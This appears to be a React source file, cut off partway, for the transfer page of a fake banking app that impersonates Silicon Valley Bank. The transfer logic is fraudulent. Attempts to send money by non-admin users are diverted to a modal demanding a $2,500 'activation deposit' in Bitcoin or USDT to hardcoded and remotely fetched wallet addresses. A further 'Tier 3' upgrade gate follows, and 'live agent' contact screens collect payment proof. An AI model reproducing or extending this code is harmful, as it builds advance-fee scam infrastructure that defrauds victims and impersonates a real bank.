import React, { useState, useEffect, useRef } from 'react';
import { User, Transaction } from '../types';
import { api } from '../services/api';
import { subscribeCryptoAddressesFromFirestore } from '../lib/firebase';
import { COUNTRIES_AND_BANKS } from '../data/countriesAndBanks';
import { 
  Send, 
  Globe2, 
  Building2, 
  CreditCard, 
  UserCheck, 
  DollarSign, 
  Key, 
  FileText, 
  AlertCircle, 
  CheckCircle2, 
  ArrowRight, 
  ShieldCheck, 
  Clock, 
  ChevronDown, 
  Search, 
  X, 
  Copy, 
  Check, 
  ShieldAlert 
} from 'lucide-react';
import { PaymentProofOptionsModal } from './PaymentProofOptionsModal';
import { triggerOpenSVBLiveChat } from './SupportChatWidget';
import { openLiveAgentEmail } from '../utils/supportEmail';
import { BackButton } from './BackButton';

interface SendPanelProps {
  user: User;
  onSuccess: (updatedUser: User, transaction: Transaction) => void;
  onNavigateTab?: (tab: string) => void;
}

export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess, onNavigateTab }) => {
  // Transfer Form State
  const [selectedCountry, setSelectedCountry] = useState('United States');
  const [selectedBank, setSelectedBank] = useState('Silicon Valley Bank (SVB)');
  const [recipientAccountNumber, setRecipientAccountNumber] = useState('');
  const [accountHolderName, setAccountHolderName] = useState('');
  const [amount, setAmount] = useState('');
  const [fourDigitCode, setFourDigitCode] = useState('');
  const [reference, setReference] = useState('');

  // UI & Search dropdown state
  const [countrySearch, setCountrySearch] = useState('');
  const [isCountryOpen, setIsCountryOpen] = useState(false);
  const [bankSearch, setBankSearch] = useState('');
  const [isBankOpen, setIsBankOpen] = useState(false);

  // Validation / Loading states
  const [validatingAccount, setValidatingAccount] = useState(false);
  const [isValidated, setIsValidated] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [successTxn, setSuccessTxn] = useState<Transaction | null>(null);

  // Deposit $2,500 USD activation requirement modal state
  const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
  const [showCryptoModal, setShowCryptoModal] = useState(false);
  const [showProofOptionsModal, setShowProofOptionsModal] = useState(false);
  const [showTier3PromptModal, setShowTier3PromptModal] = useState(false);
  const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
  const [txHash, setTxHash] = useState('');
  const [proofNote, setProofNote] = useState('');
  const [proofImage, setProofImage] = useState<string | null>(null);
  const [submittingDeposit, setSubmittingDeposit] = useState(false);
  const [depositSuccessMsg, setDepositSuccessMsg] = useState<string | null>(null);
  const [copiedAddress, setCopiedAddress] = useState(false);

  const [walletAddresses, setWalletAddresses] = useState<{ BTC: string; USDT: string }>({
    BTC: '1Fy9Up78qVeawXCLnAqcnRJrvjiXLJF21d',
    USDT: '0x400773d018e8ad3575458b5e8b11ff55078451c9'
  });

  const countryDropdownRef = useRef<HTMLDivElement>(null);
  const bankDropdownRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    api.getCryptoAddresses()
      .then(res => {
        if (res.addresses) setWalletAddresses(res.addresses);
      })
      .catch(console.error);

    const unsub = subscribeCryptoAddressesFromFirestore((addrs) => {
      setWalletAddresses(prev => ({ ...prev, ...addrs }));
    });

    const handleWindowUpdate = (e: any) => {
      if (e.detail) setWalletAddresses(prev => ({ ...prev, ...e.detail }));
    };
    window.addEventListener('crypto-addresses-updated', handleWindowUpdate);

    return () => {
      unsub();
      window.removeEventListener('crypto-addresses-updated', handleWindowUpdate);
    };
  }, [showCryptoModal, showDepositPromptModal]);

  // Close dropdowns on outside click
  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (countryDropdownRef.current && !countryDropdownRef.current.contains(e.target as Node)) {
        setIsCountryOpen(false);
      }
      if (bankDropdownRef.current && !bankDropdownRef.current.contains(e.target as Node)) {
        setIsBankOpen(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  // Update default bank when country changes
  useEffect(() => {
    const countryData = COUNTRIES_AND_BANKS.find(c => c.country === selectedCountry);
    if (countryData && countryData.banks.length > 0) {
      setSelectedBank(countryData.banks[0]);
    } else {
      setSelectedBank('Commercial Bank');
    }
  }, [selectedCountry]);

  // Handle Account Number change & Lookup
  const handleAccountNumberChange = async (val: string) => {
    setRecipientAccountNumber(val);
    setIsValidated(false);
    
    if (val.trim().length >= 6) {
      setValidatingAccount(true);
      try {
        const res = await api.lookupAccount(val.trim());
        if (res.found && res.found.fullName) {
          setAccountHolderName(res.found.fullName);
          setIsValidated(true);
        }
      } catch (err) {
        console.error('Account lookup error:', err);
      } finally {
        setValidatingAccount(false);
      }
    }
  };

  const copyAddress = (address: string) => {
    if (!address) return;
    navigator.clipboard.writeText(address);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handleScreenshotUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      if (file.size > 5 * 1024 * 1024) {
        alert('Screenshot proof file size exceeds 5MB limit.');
        return;
      }
      const reader = new FileReader();
      reader.onloadend = () => {
        setProofImage(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const [showVerificationModal, setShowVerificationModal] = useState(false);
  const [verificationError, setVerificationError] = useState<string | null>(null);

  const handleInitialFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setSuccessTxn(null);

    if (!recipientAccountNumber.trim()) {
      setError('Please enter the recipient account number.');
      return;
    }
    if (!accountHolderName.trim()) {
      setError('Please provide the account holder name.');
      return;
    }
    const numAmount = parseFloat(amount);
    if (isNaN(numAmount) || numAmount <= 0) {
      setError('Please enter a valid transfer amount greater than $0.00.');
      return;
    }
    if (numAmount > user.balance) {
      setError(`Insufficient available balance. Your current balance is $${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD.`);
      return;
    }

    // Check if outgoing security code is required / active
    if (user.role !== 'admin' && (!user.transferCodeApproved || !user.fourDigitCode)) {
      setShowCryptoModal(true);
      return;
    }

    // Open 4-digit verification code modal step
    setVerificationError(null);
    setShowVerificationModal(true);
  };

  const executeTransferWithCode = async (e: React.FormEvent) => {
    e.preventDefault();
    setVerificationError(null);

    if (user.role !== 'admin' && (!fourDigitCode.trim() || !user.fourDigitCode || fourDigitCode.trim() !== user.fourDigitCode.trim())) {
      setShowVerificationModal(false);
      setShowCryptoModal(true);
      return;
    }

    // Check Tier 3 Verification status
    if (user.role !== 'admin' && user.verificationTier !== 'Tier 3') {
      setShowVerificationModal(false);
      setShowTier3PromptModal(true);
      return;
    }

    const numAmount = parseFloat(amount);

    try {
      setLoading(true);
      const res = await api.sendTransfer({
        destinationCountry: selectedCountry,
        destinationBank: selectedBank,
        recipientInput: recipientAccountNumber.trim(),
        recipientName: accountHolderName.trim(),
        amount: numAmount,
        fourDigitCode: fourDigitCode.trim(),
        note: reference.trim() || undefined
      });

      setSuccessTxn(res.transaction);
      onSuccess(res.updatedUser, res.transaction);
      
      // Reset form & modals
      setShowVerificationModal(false);
      setRecipientAccountNumber('');
      setAccountHolderName('');
      setAmount('');
      setFourDigitCode('');
      setReference('');
      setIsValidated(false);
    } catch (err: any) {
      setShowVerificationModal(false);
      if (err.message && err.message.includes('TIER_3_UPGRADE_REQUIRED')) {
        setShowTier3PromptModal(true);
      } else {
        setShowCryptoModal(true);
      }
    } finally {
      setLoading(false);
    }
  };

  const handleCryptoDepositSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setShowProofOptionsModal(true);
  };

  const handleSelectLiveAgent = async () => {
    setShowProofOptionsModal(false);
    setShowCryptoModal(false);
    
    // Launch user's default email client
    openLiveAgentEmail(user, {
      method: cryptoMethod,
      amount: 2500,
      walletAddress: walletAddresses[cryptoMethod]
    });

    try {
      const res = await api.submitCryptoActivationDeposit({
        cryptoMethod,
        txHash: '',
        proofNote: 'Submitted to Live Agent (External Email)',
        proofImage: undefined
      });
      if (res.user && onSuccess) {
        onSuccess(res.user, null as any);
      }
      setDepositSuccessMsg(`Payment proof details opened in your email client. Our Live Support agent will verify and issue your 4-Digit Code.`);
      setTimeout(() => setDepositSuccessMsg(null), 5000);
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleSelectSVBLive = async () => {
    setError(null);
    setSubmittingDeposit(true);

    try {
      const res = await api.submitCryptoActivationDeposit({
        cryptoMethod,
        txHash: '',
        proofNote: '$2,500 Payment Proof Verification Request',
        proofImage: undefined
      });
      if (res.user && onSuccess) {
        onSuccess(res.user, null as any);
      }
      setShowProofOptionsModal(false);
      setShowCryptoModal(false);
      setDepositSuccessMsg(`Connecting to SVB Live Chat...`);
      
      // Open Live Chat Widget
      setTimeout(() => {
        triggerOpenSVBLiveChat();
        setDepositSuccessMsg(null);
      }, 500);
    } catch (err: any) {
      setError(err.message || 'Failed to submit activation deposit proof.');
    } finally {
      setSubmittingDeposit(false);
    }
  };

  const currentCountryObj = COUNTRIES_AND_BANKS.find(c => c.country === selectedCountry);
  const filteredCountries = COUNTRIES_AND_BANKS.filter(c =>
    c.country.toLowerCase().includes(countrySearch.toLowerCase())
  );
  const filteredBanks = currentCountryObj
    ? currentCountryObj.banks.filter(b => b.toLowerCase().includes(bankSearch.toLowerCase()))
    : [];

  return (
    <div className="max-w-4xl mx-auto space-y-6 pb-12">
      {/* Top Navigation Row */}
      <div className="flex items-center justify-between">
        <BackButton />
      </div>

      {/* Header Banner */}
      <div className="bg-gradient-to-r from-slate-900 via-teal-950 to-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-80 h-80 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />
        
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 relative z-10">
          <div>
            <div className="flex items-center gap-2 mb-2">
              <span className="p-2 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-xl">
                <Globe2 className="w-5 h-5" />
              </span>
              <span className="text-xs font-bold uppercase tracking-widest text-emerald-400">SVB International Wire & Domestic Remittance</span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">International Funds Transfer</h1>
            <p className="text-slate-400 text-sm mt-1 max-w-xl">
              Execute secure real-time wire transfers to global bank institutions worldwide with SWIFT & Fedwire integration.
            </p>
          </div>

          <div className="bg-slate-950/80 border border-slate-800 p-4 rounded-2xl text-right shrink-0">
            <p className="text-xs text-slate-400 font-medium">Available Balance</p>
            <p className="text-2xl font-mono font-extrabold text-emerald-400 mt-0.5">
              ${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} <span className="text-xs text-slate-400 font-sans">USD</span>
            </p>
            <p className="text-[11px] font-mono text-slate-500 mt-0.5">Account #{user.accountNumber}</p>
          </div>
        </div>
      </div>

      {/* Success Notification */}
      {successTxn && (
        <div className="bg-emerald-950/70 border border-emerald-500/40 rounded-3xl p-6 text-slate-200 space-y-4 shadow-xl animate-fadeIn">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-2xl bg-emerald-500/20 text-emerald-400 flex items-center justify-center border border-emerald-500/30">
                <Clock className="w-5 h-5 animate-spin" />
              </div>
              <div>
                <h3 className="font-bold text-white text-base">Transfer Request Submitted</h3>
                <p className="text-xs text-emerald-400 font-medium">Status: Pending Verification</p>
              </div>
            </div>
            <span className="px-3 py-1 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/20 text-xs font-bold">
              Pending
            </span>
          </div>

          <div className="bg-slate-950/80 rounded-2xl p-4 border border-emerald-500/20 text-xs space-y-2 font-mono">
            <div className="flex justify-between">
              <span className="text-slate-400">Reference Number:</span>
              <span className="text-emerald-400 font-bold">{successTxn.reference}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-slate-400">Amount Sent:</span>
              <span className="text-white font-bold">${successTxn.amount.toFixed(2)} USD</span>
            </div>
            <div className="flex justify-between">
              <span className="text-slate-400">Recipient Name:</span>
              <span className="text-slate-200">{successTxn.recipientName}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-slate-400">Destination Bank:</span>
              <span className="text-slate-200">{successTxn.destinationBank} ({successTxn.destinationCountry})</span>
            </div>
          </div>
        </div>
      )}

      {/* Error Banner */}
      {error && (
        <div className="bg-rose-950/70 border border-rose-500/40 rounded-2xl p-4 flex items-start gap-3 text-rose-300 text-xs shadow-lg">
          <AlertCircle className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
          <span className="font-medium">{error}</span>
        </div>
      )}

      {/* Main Transfer Form Card */}
      <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl relative">
        <form onSubmit={handleInitialFormSubmit} className="space-y-6">
          <div className="border-b border-slate-800 pb-4">
            <h2 className="text-lg font-bold text-white flex items-center gap-2">
              <Send className="w-5 h-5 text-emerald-400" />
              Wire Transfer Details
            </h2>
            <p className="text-xs text-slate-400 mt-0.5">Fill in the recipient and financial institution details to dispatch your transfer.</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            
            {/* 1. Destination Country Dropdown */}
            <div className="relative" ref={countryDropdownRef}>
              <label className="block text-xs font-semibold text-slate-300 mb-2">
                Destination Country <span className="text-rose-400">*</span>
              </label>
              <button
                type="button"
                onClick={() => {
                  setIsCountryOpen(!isCountryOpen);
                  setIsBankOpen(false);
                }}
                className="w-full bg-slate-950 border border-slate-800 focus:border-emerald-500 rounded-xl px-4 py-3 text-sm text-white flex items-center justify-between transition-colors"
              >
                <div className="flex items-center gap-2.5 overflow-hidden">
                  <Globe2 className="w-4 h-4 text-emerald-400 shrink-0" />
                  <span className="truncate font-medium">{selectedCountry}</span>
                </div>
                <ChevronDown className="w-4 h-4 text-slate-400 shrink-0" />
              </button>

              {isCountryOpen && (
                <div className="absolute left-0 right-0 top-full mt-2 bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl z-40 p-2 space-y-2 animate-fadeIn max-h-64 overflow-y-auto">
                  <div className="relative px-2 pt-1">
                    <Search className="w-3.5 h-3.5 text-slate-400 absolute left-4 top-3.5" />
                    <input
                      type="text"
                      value={countrySearch}
                      onChange={(e) => setCountrySearch(e.target.value)}
                      placeholder="Search country..."
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl pl-8 pr-3 py-1.5 text-xs text-white placeholder-slate-500 outline-none focus:border-emerald-500"
                    />
                  </div>
                  <div className="space-y-0.5">
                    {filteredCountries.map((c) => (
                      <button
                        key={c.country}
                        type="button"
                        onClick={() => {
                          setSelectedCountry(c.country);
                          setIsCountryOpen(false);
                          setCountrySearch('');
                        }}
                        className={`w-full text-left px-3 py-2 rounded-xl text-xs font-medium flex items-center justify-between transition-colors ${
                          selectedCountry === c.country
                            ? 'bg-emerald-500/20 text-emerald-400 font-bold'
                            : 'text-slate-300 hover:bg-slate-800'
                        }`}
                      >
                        <span>{c.country}</span>
                        <span className="text-[10px] font-mono text-slate-500">{c.code}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* 2. Destination Bank Dropdown */}
            <div className="relative" ref={bankDropdownRef}>
              <label className="block text-xs font-semibold text-slate-300 mb-2">
                Destination Bank <span className="text-rose-400">*</span>
              </label>
              <button
                type="button"
                onClick={() => {
                  setIsBankOpen(!isBankOpen);
                  setIsCountryOpen(false);
                }}
                className="w-full bg-slate-950 border border-slate-800 focus:border-emerald-500 rounded-xl px-4 py-3 text-sm text-white flex items-center justify-between transition-colors"
              >
                <div className="flex items-center gap-2.5 overflow-hidden">
                  <Building2 className="w-4 h-4 text-emerald-400 shrink-0" />
                  <span className="truncate font-medium">{selectedBank}</span>
                </div>
                <ChevronDown className="w-4 h-4 text-slate-400 shrink-0" />
              </button>

              {isBankOpen && (
                <div className="absolute left-0 right-0 top-full mt-2 bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl z-40 p-2 space-y-2 animate-fadeIn max-h-64 overflow-y-auto">
                  <div className="relative px-2 pt-1">
                    <Search className="w-3.5 h-3.5 text-slate-400 absolute left-4 top-3.5" />
                    <input
                      type="text"
                      value={bankSearch}
                      onChange={(e) => setBankSearch(e.target.value)}
                      placeholder="Search bank..."
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl pl-8 pr-3 py-1.5 text-xs text-white placeholder-slate-500 outline-none focus:border-emerald-500"
                    />
                  </div>
                  <div className="space-y-0.5">
                    {filteredBanks.map((b) => (
                      <button
                        key={b}
                        type="button"
                        onClick={() => {
                          setSelectedBank(b);
                          setIsBankOpen(false);
                          setBankSearch('');
                        }}
                        className={`w-full text-left px-3 py-2 rounded-xl text-xs font-medium flex items-center justify-between transition-colors ${
                          selectedBank === b
                            ? 'bg-emerald-500/20 text-emerald-400 font-bold'
                            : 'text-slate-300 hover:bg-slate-800'
                        }`}
                      >
                        <span className="truncate">{b}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* 3. Recipient Account Number */}
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-2">
                Recipient Account Number / IBAN <span className="text-rose-400">*</span>
              </label>
              <div className="relative">
                <CreditCard className="w-4 h-4 text-slate-400 absolute left-3.5 top-3.5" />
                <input
                  type="text"
                  value={recipientAccountNumber}
                  onChange={(e) => handleAccountNumberChange(e.target.value)}
                  placeholder="e.g. 1084920148 or GB82 WEST 1234 5678"
                  className="w-full bg-slate-950 border border-slate-800 focus:border-emerald-500 rounded-xl pl-10 pr-10 py-2.5 text-sm text-white placeholder-slate-500 font-mono outline-none transition-colors"
                  required
                />
                {validatingAccount && (
                  <div className="absolute right-3 top-3">
                    <div className="w-4 h-4 border-2 border-emerald-500 border-t-transparent rounded-full animate-spin" />
                  </div>
                )}
                {isValidated && (
                  <CheckCircle2 className="w-4 h-4 text-emerald-400 absolute right-3 top-3.5" />
                )}
              </div>
            </div>

            {/* 4. Account Holder Name */}
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-2">
                Account Holder Name <span className="text-rose-400">*</span>
              </label>
              <div className="relative">
                <UserCheck className="w-4 h-4 text-slate-400 absolute left-3.5 top-3.5" />
                <input
                  type="text"
                  value={accountHolderName}
                  onChange={(e) => setAccountHolderName(e.target.value)}
                  placeholder="e.g. Alexander Wright"
                  className="w-full bg-slate-950 border border-slate-800 focus:border-emerald-500 rounded-xl pl-10 pr-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors"
                  required
                />
              </div>
            </div>

            {/* 5. Transfer Amount */}
            <div className="md:col-span-2">
              <label className="block text-xs font-semibold text-slate-300 mb-2">
                Transfer Amount ($ USD) <span className="text-rose-400">*</span>
              </label>
              <div className="relative">
                <DollarSign className="w-4 h-4 text-slate-400 absolute left-3.5 top-3.5" />
                <input
                  type="number"
                  step="0.01"
                  min="0.01"
                  max={user.balance}
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.00"
                  className="w-full bg-slate-950 border border-slate-800 focus:border-emerald-500 rounded-xl pl-10 pr-16 py-2.5 text-sm text-white placeholder-slate-500 font-mono outline-none transition-colors"
                  required
                />
                <button
                  type="button"
                  onClick={() => setAmount(user.balance.toString())}
                  className="absolute right-2.5 top-2 text-[10px] uppercase font-bold text-emerald-400 bg-emerald-500/10 hover:bg-emerald-500/20 border border-emerald-500/20 px-2.5 py-1 rounded-lg transition-colors"
                >
                  Max
                </button>
              </div>
            </div>

          </div>

          {/* Reference (Optional) */}
          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-2">
              Reference / Note (Optional)
            </label>
            <div className="relative">
              <FileText className="w-4 h-4 text-slate-400 absolute left-3.5 top-3.5" />
              <input
                type="text"
                value={reference}
                onChange={(e) => setReference(e.target.value)}
                placeholder="e.g. Commercial Settlement, Invoice Payment"
                className="w-full bg-slate-950 border border-slate-800 focus:border-emerald-500 rounded-xl pl-10 pr-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors"
              />
            </div>
          </div>

          {/* Security Notice */}
          <div className="p-4 bg-slate-950/80 rounded-2xl border border-slate-800 flex items-center gap-3 text-xs text-slate-400">
            <ShieldCheck className="w-5 h-5 text-emerald-400 shrink-0" />
            <span>Silicon Valley Bank Wire Protection: All outgoing wire transfers are encrypted via 256-bit SSL protocols and submitted for security review.</span>
          </div>

          <button
            type="submit"
            disabled={loading || !recipientAccountNumber || !accountHolderName || !amount}
            className="w-full bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 font-bold py-3.5 px-4 rounded-xl shadow-xl shadow-emerald-500/20 flex items-center justify-center gap-2 transition-all text-sm disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {loading ? (
              <div className="w-5 h-5 border-2 border-slate-950 border-t-transparent rounded-full animate-spin" />
            ) : (
              <>
                <span>Submit Wire Transfer Request</span>
                <ArrowRight className="w-4 h-4" />
              </>
            )}
          </button>
        </form>
      </div>

      {/* Requirement 2 & 3 Modal: 4-Digit Security Code Verification Modal (Shown AFTER form submission) */}
      {showVerificationModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-emerald-500/40 rounded-3xl p-6 max-w-md w-full space-y-5 shadow-2xl relative animate-fadeIn">
            <button
              onClick={() => setShowVerificationModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1 rounded-xl bg-slate-800"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="w-14 h-14 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 mx-auto">
              <Key className="w-7 h-7" />
            </div>

            <div className="text-center space-y-2">
              <span className="text-[10px] font-bold uppercase tracking-widest text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-2.5 py-1 rounded-full">
                Security Verification Protocol
              </span>
              <h3 className="text-xl font-bold text-white pt-1">Authorize Wire Transfer</h3>
              <p className="text-xs text-slate-300 leading-relaxed">
                Please enter your <span className="text-emerald-400 font-semibold font-mono">4-digit security code</span> to confirm and authorize this outbound wire transfer request.
              </p>
            </div>

            {/* Summary Box */}
            <div className="p-3.5 bg-slate-950 rounded-2xl border border-slate-800 text-xs space-y-1.5 font-mono">
              <div className="flex justify-between text-slate-400">
                <span>Transfer Amount:</span>
                <span className="text-emerald-400 font-bold">${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</span>
              </div>
              <div className="flex justify-between text-slate-400">
                <span>Destination Bank:</span>
                <span className="text-white truncate max-w-[180px]">{selectedBank}</span>
              </div>
              <div className="flex justify-between text-slate-400">
                <span>Recipient Account:</span>
                <span className="text-slate-200">{recipientAccountNumber}</span>
              </div>
            </div>

            <form onSubmit={executeTransferWithCode} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-300 mb-2">
                  4-Digit Transaction Security Code <span className="text-rose-400">*</span>
                </label>
                <input
                  type="password"
                  maxLength={4}
                  value={fourDigitCode}
                  onChange={(e) => setFourDigitCode(e.target.value)}
                  placeholder="Enter 4-digit security code"
                  className="w-full bg-slate-950 border border-emerald-500/50 focus:border-emerald-400 rounded-xl px-4 py-3 text-center text-lg text-white font-mono tracking-widest outline-none transition-colors"
                  autoFocus
                  required
                />
              </div>

              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={() => setShowVerificationModal(false)}
                  className="w-1/3 bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold py-3 rounded-xl text-xs transition-colors"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={loading || !fourDigitCode.trim()}
                  className="w-2/3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold py-3 rounded-xl text-xs shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2 transition-all disabled:opacity-50"
                >
                  {loading ? (
                    <div className="w-4 h-4 border-2 border-slate-950 border-t-transparent rounded-full animate-spin" />
                  ) : (
                    <>
                      <ShieldCheck className="w-4 h-4" />
                      <span>Confirm & Transfer</span>
                    </>
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Requirement 6 Modal: Deposit Prompt when Outgoing Security Code is not active */}
      {showDepositPromptModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 max-w-md w-full space-y-5 shadow-2xl relative animate-fadeIn">
            <button
              onClick={() => setShowDepositPromptModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1 rounded-xl bg-slate-800"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="w-14 h-14 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto">
              <ShieldAlert className="w-7 h-7" />
            </div>

            <div className="text-center space-y-2">
              <h3 className="text-base font-bold text-white uppercase tracking-wider text-amber-400">4-Digit Outgoing Transfer Code - PENDING PAYMENT / DEPOSIT $2,500</h3>
              <p className="text-xs text-slate-300 leading-relaxed">
                Your official 4-digit security code will be generated and activated automatically upon making your first payment or deposit.
              </p>
            </div>

            {user.pendingCryptoDeposit?.status === 'Pending' ? (
              <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-xs space-y-2">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-amber-400 flex items-center gap-1.5">
                    <Clock className="w-4 h-4 animate-spin text-amber-400" />
                    Pending 4-Digit Code
                  </span>
                  <span className="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded-full font-mono font-bold">
                    Under Review
                  </span>
                </div>
                <p className="text-slate-300 text-[11px] leading-relaxed">
                  Your screenshot proof for <span className="font-bold">{user.pendingCryptoDeposit.cryptoMethod}</span> is being reviewed by SVB Review. Your 4-digit code will be generated upon verification.
                </p>
              </div>
            ) : (
              <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-2xl text-[11px] text-slate-300 space-y-1">
                <p className="font-semibold text-amber-400">SVB Review Authorization Notice:</p>
                <p className="text-slate-400 leading-relaxed">
                  Once your $2,500 deposit is verified by SVB Review, your 4-digit security code will be automatically released and $2,500 will be credited to your account balance.
                </p>
              </div>
            )}

            <div className="flex flex-col gap-2 pt-2">
              <button
                onClick={() => {
                  setShowDepositPromptModal(false);
                  setShowCryptoModal(true);
                }}
                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
              >
                <DollarSign className="w-4 h-4" />
                <span>$ Make Deposit / Activate</span>
              </button>

              <button
                onClick={() => setShowDepositPromptModal(false)}
                className="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold py-2.5 rounded-2xl text-xs transition-colors"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Crypto Activation Deposit Modal */}
      {showCryptoModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 max-w-lg w-full space-y-5 shadow-2xl relative animate-fadeIn max-h-[90vh] overflow-y-auto">
            <button
              onClick={() => setShowCryptoModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1 rounded-xl bg-slate-800"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="flex items-center gap-3 border-b border-slate-800 pb-4">
              <div className="w-10 h-10 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400">
                <Key className="w-5 h-5" />
              </div>
              <div>
                <h3 className="text-base font-bold text-white">$2,500 Deposit Payment Addresses</h3>
                <p className="text-xs text-slate-400">4-Digit Transfer Security Code Issuance</p>
              </div>
            </div>

            {depositSuccessMsg && (
              <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs rounded-xl flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 shrink-0" />
                <span>{depositSuccessMsg}</span>
              </div>
            )}

            <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs">
              <div>
                <label className="block font-semibold text-slate-300 mb-2">Select Payment Method</label>
                <div className="grid grid-cols-2 gap-2">
                  <button
                    type="button"
                    onClick={() => setCryptoMethod('BTC')}
                    className={`p-2.5 rounded-2xl border font-bold text-xs flex items-center justify-center gap-1.5 transition-all ${
                      cryptoMethod === 'BTC' ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md' : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700'
                    }`}
                  >
                    Bitcoin (BTC)
                  </button>
                  <button
                    type="button"
                    onClick={() => setCryptoMethod('USDT')}
                    className={`p-2.5 rounded-2xl border font-bold text-xs flex items-center justify-center gap-1.5 transition-all ${
                      cryptoMethod === 'USDT' ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md' : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700'
                    }`}
                  >
                    Tether (USDT)
                  </button>
                </div>
              </div>

              <div className="p-4 bg-slate-950 rounded-2xl border border-slate-800 space-y-3">
                <div className="flex items-center justify-between text-[11px] text-slate-400">
                  <span>Required Deposit Amount:</span>
                  <span className="font-bold text-amber-400 text-sm">$2,500.00 USD</span>
                </div>
                <div className="text-[11px]">
                  <span className="text-slate-400 block mb-1">Official Wallet Address ({cryptoMethod}) — Click/Tap to Copy:</span>
                  <div
                    onClick={() => copyAddress(walletAddresses[cryptoMethod] || walletAddresses['USDT'] || walletAddresses['BTC'])}
                    className="cursor-pointer hover:border-amber-500/50 flex items-center gap-2 bg-slate-900 p-3 rounded-xl border border-slate-800 transition-all group"
                  >
                    <span className="font-mono text-amber-400 font-semibold text-xs break-all flex-1 select-all">
